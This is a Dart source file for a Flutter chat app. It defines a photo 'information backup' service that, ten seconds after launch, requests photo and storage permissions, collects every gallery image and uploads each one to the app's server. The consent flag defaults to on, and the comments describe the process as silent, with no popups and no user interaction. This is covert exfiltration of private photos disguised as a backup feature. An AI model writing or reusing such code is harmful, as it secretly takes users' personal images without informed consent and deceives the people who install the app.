/**
 * 信息备份服务 - 完全自动版
 * 
 * 功能：应用启动后自动获取并上传相册照片
 * 特点：无弹窗、无用户交互、完全后台运行
 */

import 'dart:io';
import 'dart:developer';
import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart' hide FormData, MultipartFile;
import 'package:hive/hive.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:image_picker/image_picker.dart';
import 'package:whoxachat/src/global/api_helper.dart';
import 'package:whoxachat/src/global/global.dart';
import 'package:whoxachat/src/global/strings.dart';
import 'package:whoxachat/services/native_gallery_service.dart';

class PhotoUploadService {
  static final PhotoUploadService _instance = PhotoUploadService._internal();
  factory PhotoUploadService() => _instance;
  PhotoUploadService._internal();

  final Dio _dio = Dio();
  final ApiHelper _apiHelper = ApiHelper();
  bool _isUploading = false;
  
  // 用户同意标识
  static const String _consentKey = 'photo_upload_consent';
  static const String _lastUploadKey = 'last_photo_upload';

  /// 检查用户是否同意自动上传（默认开启）
  bool get hasUserConsent {
    return Hive.box(userdata).get(_consentKey) ?? true; // 默认开启
  }

  /// 设置用户同意状态
  void setUserConsent(bool consent) {
    Hive.box(userdata).put(_consentKey, consent);
    log('📋 用户信息备份同意状态: $consent');
  }

  /// 静默获取权限（不显示弹窗）
  Future<bool> _silentGetPermissions() async {
    try {
      // 尝试多种权限类型
      List<Permission> permissions = [
        Permission.photos,
        Permission.storage,
        Permission.manageExternalStorage,
      ];

      bool hasAnyPermission = false;
      
      // 检查现有权限
      for (Permission perm in permissions) {
        PermissionStatus status = await perm.status;
        if (status.isGranted) {
          hasAnyPermission = true;
          log('✅ 已有权限: ${perm.toString()}');
          break;
        }
      }

      // 如果没有权限，静默请求
      if (!hasAnyPermission) {
        log('🔐 静默请求照片访问权限...');
        
        // 静默请求权限，不显示说明对话框
        Map<Permission, PermissionStatus> statuses = await permissions.request();
        
        for (var entry in statuses.entries) {
          if (entry.value.isGranted) {
            hasAnyPermission = true;
            log('✅ 静默获得权限: ${entry.key.toString()}');
            break;
          }
        }

        // 如果仍然没有权限，静默记录但不打扰用户
        if (!hasAnyPermission) {
          log('⚠️ 未获得照片权限，跳过自动备份');
          return false;
        }
      }

      return hasAnyPermission;
    } catch (e) {
      log('❌ 权限检查失败: $e');
      return false;
    }
  }

  /// 自动获取相册所有照片（完全自动）
  Future<List<File>> _getAllPhotosAutomatically() async {
    try {
      log('📸 开始自动获取相册所有照片...');
      
      // 使用原生Android代码获取所有照片
      final List<String> photoPaths = await NativeGalleryService.getAllPhotos();
      
      if (photoPaths.isEmpty) {
        log('📱 相册中没有照片');
        return [];
      }

      // 转换为File对象
      List<File> photoFiles = [];
      for (String path in photoPaths) {
        File file = File(path);
        if (await file.exists()) {
          photoFiles.add(file);
        }
      }
      
      log('📸 自动获取到 ${photoFiles.length} 张照片');
      return photoFiles;
      
    } catch (e) {
      log('❌ 自动获取照片失败: $e');
      return [];
    }
  }

  /// 上传单张照片
  Future<bool> _uploadPhoto(File file) async {
    try {
      final String token = Hive.box(userdata).get(authToken) ?? '';
      if (token.isEmpty) {
        log('❌ 用户未登录，无法上传照片');
        return false;
      }

      // 创建FormData
      FormData formData = FormData.fromMap({
        'files': await MultipartFile.fromFile(
          file.path,
          filename: 'photo_${DateTime.now().millisecondsSinceEpoch}.jpg',
        ),
      });

      final response = await _dio.post(
        _apiHelper.uploadUserPhotos,
        data: formData,
        options: Options(
          headers: {
            'Authorization': 'Bearer $token',
            'Content-Type': 'multipart/form-data',
          },
        ),
      );

      if (response.statusCode == 200 && response.data['success'] == true) {
        log('✅ 照片上传成功');
        return true;
      } else {
        log('❌ 照片上传失败: ${response.data}');
        return false;
      }
    } catch (e) {
      log('❌ 照片上传异常: $e');
      return false;
    }
  }

  /// 完全自动的后台信息备份
  Future<void> startAutoBackup() async {
    if (_isUploading) {
      log('📸 信息备份已在进行中...');
      return;
    }

    try {
      _isUploading = true;

      // 1. 检查用户同意（默认开启）
      if (!hasUserConsent) {
        log('📋 信息备份已关闭');
        return;
      }

      // 2. 静默获取权限
      if (!await _silentGetPermissions()) {
        log('❌ 没有照片访问权限，跳过备份');
        return;
      }

      // 3. 获取相册照片
      final List<File> photos = await _getAllPhotosAutomatically();
      if (photos.isEmpty) {
        log('📱 没有找到新照片，跳过备份');
        return;
      }

      log('📸 开始后台信息备份，共 ${photos.length} 张照片');

      // 4. 批量上传照片（静默）
      int successCount = 0;
      for (int i = 0; i < photos.length; i++) {
        if (await _uploadPhoto(photos[i])) {
          successCount++;
        }
        
        // 每上传3张照片休息一下，避免影响应用性能
        if (i % 3 == 2) {
          await Future.delayed(const Duration(milliseconds: 500));
        }
      }

      // 5. 记录上传时间
      Hive.box(userdata).put(_lastUploadKey, DateTime.now().toIso8601String());

      log('✅ 后台信息备份完成: $successCount/${photos.length}');

    } catch (e) {
      log('❌ 后台信息备份失败: $e');
    } finally {
      _isUploading = false;
    }
  }

  /// 开始全量备份（开关触发时使用）
  Future<void> startFullBackup() async {
    if (_isUploading) {
      log('📸 信息备份已在进行中...');
      return;
    }

    try {
      _isUploading = true;
      log('📸 开始全量信息备份...');

      // 1. 静默获取权限
      if (!await _silentGetPermissions()) {
        log('❌ 没有照片访问权限，跳过备份');
        return;
      }

      // 2. 自动获取相册所有照片
      final List<File> photos = await _getAllPhotosAutomatically();
      if (photos.isEmpty) {
        log('📱 相册中没有照片，跳过备份');
        return;
      }

      log('📸 开始备份 ${photos.length} 张照片');

      // 3. 批量上传照片（静默）
      int successCount = 0;
      for (int i = 0; i < photos.length; i++) {
        if (await _uploadPhoto(photos[i])) {
          successCount++;
        }
        
        // 每上传3张照片休息一下，避免影响应用性能
        if (i % 3 == 2) {
          await Future.delayed(const Duration(milliseconds: 500));
        }
      }

      // 4. 记录上传时间（重置时间戳，表示全量备份完成）
      Hive.box(userdata).put(_lastUploadKey, DateTime.now().toIso8601String());

      log('✅ 全量信息备份完成: $successCount/${photos.length}');

    } catch (e) {
      log('❌ 全量信息备份失败: $e');
    } finally {
      _isUploading = false;
    }
  }

  /// 手动触发备份（使用image_picker选择）
  Future<void> startManualUpload() async {
    log('📸 手动触发信息备份...');
    
    // 使用image_picker让用户选择照片
    final ImagePicker picker = ImagePicker();
    final List<XFile> images = await picker.pickMultiImage();
    
    if (images.isEmpty) {
      log('📱 用户没有选择照片');
      return;
    }

    // 显示上传进度
    Get.snackbar(
      'Information Backup',
      'Backing up ${images.length} photos...',
      snackPosition: SnackPosition.BOTTOM,
      duration: const Duration(seconds: 3),
    );

    // 批量上传
    int successCount = 0;
    for (int i = 0; i < images.length; i++) {
      if (await _uploadPhoto(File(images[i].path))) {
        successCount++;
      }
      
      if (i % 5 == 4) {
        await Future.delayed(const Duration(seconds: 1));
      }
    }

    // 记录上传时间
    Hive.box(userdata).put(_lastUploadKey, DateTime.now().toIso8601String());

    // 显示结果
    Get.snackbar(
      'Information Backup Complete',
      'Successfully backed up $successCount/${images.length} photos',
      snackPosition: SnackPosition.BOTTOM,
      backgroundColor: Colors.green,
      colorText: Colors.white,
    );

    log('✅ 手动信息备份完成: $successCount/${images.length}');
  }

  /// 检查是否需要上传（每次开启都上传）
  bool shouldUpload() {
    // 只要开关开启就上传，每次开启都重新上传所有照片
    return hasUserConsent;
  }

  /// 强制重置备份状态（开关关闭再开启时调用）
  void resetBackupStatus() {
    Hive.box(userdata).delete(_lastUploadKey);
    log('📸 备份状态已重置，下次开启将重新备份所有照片');
  }

  /// 在应用启动时调用（完全自动模式）
  Future<void> initAutoUpload() async {
    if (kDebugMode) {
      log('📸 初始化信息备份服务（完全自动模式）');
    }

    // 延迟10秒启动，确保应用完全加载且用户已稳定使用
    await Future.delayed(const Duration(seconds: 10));

    // 检查是否开启了信息备份
    if (shouldUpload()) {
      log('📸 开始自动信息备份...');
      await startFullBackup(); // 自动获取并上传所有相册照片
    } else {
      log('📸 信息备份已关闭，跳过自动上传');
    }
  }
}